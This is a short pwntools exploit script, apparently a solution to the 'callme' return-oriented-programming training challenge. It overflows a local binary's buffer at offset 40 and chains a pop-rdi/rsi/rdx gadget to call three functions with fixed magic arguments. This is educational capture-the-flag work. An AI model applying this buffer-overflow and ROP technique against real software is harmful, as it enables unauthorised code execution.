from pwn import *

exe = ELF("./callme")
context.binary = exe
context.log_level = "debug"

deadbeef = p64(0xdeadbeefdeadbeef)
cafebabe = p64(0xcafebabecafebabe)
doodfood = p64(0xd00df00dd00df00d)
params = deadbeef+cafebabe+doodfood

#pop rdi ; pop rsi ; pop rdx ; ret
magic = p64(0x40093c)

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)

offset = 40
payload = flat({
    offset:[
        magic,
        params,
        callme_one,

        magic,
        params,
        callme_two,

        magic,
        params,
        callme_three,
        ]
})

io = process(exe.path)

io.sendlineafter(b"\n> ",payload)
io.interactive()

